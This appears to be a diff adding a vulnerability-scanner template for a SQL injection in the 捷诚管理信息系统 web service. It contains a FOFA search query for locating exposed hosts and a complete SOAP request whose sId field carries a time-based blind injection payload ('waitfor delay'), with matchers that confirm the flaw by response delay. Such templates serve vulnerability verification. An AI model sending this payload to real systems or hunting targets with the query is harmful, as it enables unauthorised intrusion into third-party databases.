@@ -1,0 +1,36 @@
+## id: VEID-2024-0104
+## name: 捷诚管理信息系统sql注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description:捷诚管理信息系统存在SQL
+## fofa-query: body="/Scripts/EnjoyMsg.js"
+## verification: true
+
+
+
+POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <GetOSpById xmlns="http://tempuri.org/">
+      <sId>1';waitfor delay '0:0:7'--+</sId>
+    </GetOSpById>
+  </soap:Body>
+</soap:Envelope>
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+
+
+
+
+
+# @VEIL-STAMP: ff801c2d681107a241831a254c5a9b75a86887e1b1dd88a50aa39107320ee8e4
